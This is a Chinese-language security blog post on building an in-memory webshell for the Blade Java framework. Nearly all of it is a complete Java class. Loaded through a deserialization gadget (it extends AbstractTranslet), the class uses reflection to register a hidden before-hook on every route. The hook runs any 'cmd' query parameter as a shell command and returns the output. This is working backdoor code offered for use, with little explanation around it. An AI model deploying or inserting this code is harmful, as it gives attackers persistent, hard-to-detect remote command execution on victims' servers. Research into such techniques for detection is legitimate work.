+++
date = '2025-12-30T17:00:00+08:00'
title = 'Blade框架WebHook内存马'
categories = ["Java"]
tags = ["Javasec", "Web","Java"]

+++

学习完Tomcat内存马，拿Blade来练练手，网上关于blade的内存马基本上都是利用动态注册Blade的路由来实现的，所以我这里就利用Blade中的Webhook来实现内存马，主要就是利用下面这个addWebHook方法来实现动态注册，比较简单

com.hellokaton.blade.mvc.route.RouteBuilder#addWebHook

![image-20251230170027238](../assets/image-20251230170027238.png)

```java
package com.xrntkk.Memshell;

import com.hellokaton.blade.Blade;
import com.hellokaton.blade.mvc.RouteContext;
import com.hellokaton.blade.mvc.WebContext;
import com.hellokaton.blade.mvc.hook.WebHook;
import com.hellokaton.blade.mvc.http.HttpMethod;
import com.hellokaton.blade.mvc.http.HttpResponse;
import com.hellokaton.blade.mvc.http.Request;
import com.hellokaton.blade.mvc.route.Route;
import com.hellokaton.blade.mvc.route.RouteMatcher;
import com.hellokaton.blade.server.HttpServerHandler;
import com.hellokaton.blade.server.RouteMethodHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import io.netty.channel.ChannelHandlerContext;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;

public class BladeMemHook extends AbstractTranslet {
    static{
        try{
            WebHook webHook = new WebHook() {
                @Override
                public boolean before(RouteContext routeContext) {
                    WebContext context = WebContext.get();
                    HttpResponse response = (HttpResponse) context.getResponse();
                    Request request = context.getRequest();
                    try{
                        String cmd = request.query("cmd", "");
                        System.out.println(cmd);
                        if(cmd!=""){
                            Process process = Runtime.getRuntime().exec(cmd);
                            StringBuilder output = new StringBuilder();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                            BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                            String line;
                            while ((line = reader.readLine()) != null) {
                                output.append(line).append("\n");
                            }
                            while ((line = errReader.readLine()) != null) {
                                output.append(line).append("\n");
                            }


                            response.body(output.toString());

                        }

                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    return false;
                }

                @Override
                public boolean after(RouteContext context) {
                    System.out.println("after route");
                    return WebHook.super.after(context);
                }
            };

            Blade blade = WebContext.blade();

            //要手动加入ioc容器
            blade.ioc().addBean(webHook);

            RouteMatcher routematcher = blade.routeMatcher();
            WebContext webContext = WebContext.get();
            ChannelHandlerContext handlerContext = webContext.getHandlerContext();
            Class handlerContextClass = handlerContext.getClass();
            Field handler = handlerContextClass.getDeclaredField("handler");
            handler.setAccessible(true);
            HttpServerHandler httpserverhandler = (HttpServerHandler) handler.get(handlerContext);

            Class httpserverhandlerClass = httpserverhandler.getClass();
            Field routeHandler = httpserverhandlerClass.getDeclaredField("routeHandler");
            routeHandler.setAccessible(true);
            RouteMethodHandler routeMethodHandler = (RouteMethodHandler) routeHandler.get(httpserverhandler);

            Class routeMethodHandlerClass = routeMethodHandler.getClass();
            Field hasBeforeHook = routeMethodHandlerClass.getDeclaredField("hasBeforeHook");
            Field modifiersField = Field.class.getDeclaredField("modifiers"); 
            modifiersField.setAccessible(true);
            modifiersField.setInt(hasBeforeHook , hasBeforeHook.getModifiers() & ~Modifier.FINAL);
            hasBeforeHook.setAccessible(true);
            hasBeforeHook.set(routeMethodHandler, true);

            Class routematcherClass = routematcher.getClass();

            Method addRoute = routematcherClass.getDeclaredMethod("addRoute", Route.class);
            addRoute.setAccessible(true);
            addRoute.invoke(routematcher, new Route().builder().target(webHook).targetType(webHook.getClass()).action(webHook.getClass().getDeclaredMethod("before", RouteContext.class)).path("/*").httpMethod(HttpMethod.BEFORE).build());

            routematcherClass.getDeclaredMethod("register").invoke(routematcher);

        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {

    }
}
```

